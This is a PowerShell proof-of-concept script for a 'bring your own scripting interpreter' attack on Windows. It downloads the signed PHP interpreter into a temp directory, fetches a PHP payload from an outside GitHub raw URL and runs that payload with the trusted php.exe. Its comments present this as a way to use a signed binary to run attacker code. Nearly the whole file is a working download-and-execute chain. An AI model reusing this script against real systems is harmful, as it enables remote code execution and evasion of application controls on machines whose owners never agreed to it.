# 1. Define Paths
$phpUrl = "https://windows.php.net/downloads/releases/php-8.3.13-nts-Win32-vs16-x64.zip"
$tempDir = "$env:TEMP\php_test"
$phpZip = "$tempDir\php.zip"
$phpDir = "$tempDir\bin"

# CHANGE THIS to the path where you saved your PHP files from Step 1
# OLD: $localPayload = "C:\Users\Public\poc_calc.php"
# NEW: Point to your raw GitHub URL for poc.php
$payloadUrl = "https://raw.githubusercontent.com/pixelsofts/testing/refs/heads/main/poc_calc.php"

# 2. Setup Workspace
Write-Host "[*] Setting up workspace at $tempDir..." -ForegroundColor Cyan
New-Item -ItemType Directory -Force -Path $tempDir | Out-Null
New-Item -ItemType Directory -Force -Path $phpDir | Out-Null

# 3. Download PHP Interpreter (The "Trusted" Binary)
# We check if it exists first to save bandwidth on repeated tests
if (-not (Test-Path $phpZip)) {
    Write-Host "[*] Downloading PHP (Signed Binary)..." -ForegroundColor Yellow
    Invoke-WebRequest -Uri $phpUrl -OutFile $phpZip
}

# 4. Extract PHP
Write-Host "[*] Extracting PHP..." -ForegroundColor Yellow
Expand-Archive -Path $phpZip -DestinationPath $phpDir -Force

# 5. Copy our Payload
Write-Host "[*] Staging Payload..." -ForegroundColor Yellow
# OLD: Copy-Item -Path $localPayload -Destination "$phpDir\poc.php"
Invoke-WebRequest -Uri $payloadUrl -OutFile "$phpDir\poc.php"

# 6. EXECUTE
Write-Host "[*] Executing BYOSI Attack..." -ForegroundColor Green
Write-Host "---------------------------------------------------"
# This is the magic line. We use the signed php.exe to run our script.
& "$phpDir\php.exe" -f "$phpDir\poc.php"
Write-Host "---------------------------------------------------"

# 7. Optional Cleanup (Uncomment to auto-delete)
# Remove-Item -Recurse -Force $tempDir
# Write-Host "[*] Cleanup complete." -ForegroundColor Cyan
